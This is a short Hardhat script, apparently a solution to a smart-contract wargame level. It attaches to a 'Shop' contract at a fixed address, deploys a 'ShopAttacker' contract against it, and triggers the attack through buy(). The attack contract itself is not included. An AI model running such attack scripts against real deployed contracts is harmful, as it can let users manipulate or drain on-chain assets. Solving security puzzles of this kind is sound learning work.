const { ethers } = require("hardhat");

const SHOP_CONTRACT_NAME = "Shop";
const SHOP_CONTRACT_ADDRESS = "0x87a64F630183091Db463C0968e5633EbdA56F2a6";
const ATTACKER_CONTRACT_NAME = "ShopAttacker";

async function main() {
    const shopFactory = await ethers.getContractFactory(SHOP_CONTRACT_NAME);
    const shopContract = shopFactory.attach(SHOP_CONTRACT_ADDRESS);

    const attackerFactory = await ethers.getContractFactory(ATTACKER_CONTRACT_NAME);
    const attackerContract = await attackerFactory.deploy(shopContract.address);

    await attackerContract.deployed();

    const ATTACKER_CONTRACT_ADDRESS = attackerContract.address;
    console.log("Attacker Contract deployed at: ", ATTACKER_CONTRACT_ADDRESS);

    let tx = await attackerContract.buy();
    await tx.wait();
}

main().catch(error => {
    console.error(error);
    process.exit(1);
})